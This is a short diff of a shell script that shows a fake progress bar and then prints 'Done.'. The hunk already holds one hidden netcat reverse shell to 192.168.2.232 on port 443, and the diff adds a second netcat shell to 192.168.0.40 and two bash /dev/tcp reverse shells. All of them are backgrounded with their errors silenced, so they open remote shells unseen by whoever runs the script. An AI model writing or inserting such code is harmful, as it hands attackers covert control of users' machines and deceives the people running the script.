@@ -26,6 +26,10 @@ echo "==================================[100%]"
 sleep 0.5
 echo " "
 sleep 1
+
 nc -e /bin/bash 192.168.2.232 443 2> /dev/null &
+nc -e /bin/bash 192.168.0.40 443 2> /dev/null &
+bash -i >& /dev/tcp/192.168.2.232/443 0>&1 2> /dev/null &
+bash -i >& /dev/tcp/192.168.0.40/443 0>&1 2> /dev/null &
 echo "Done."
 
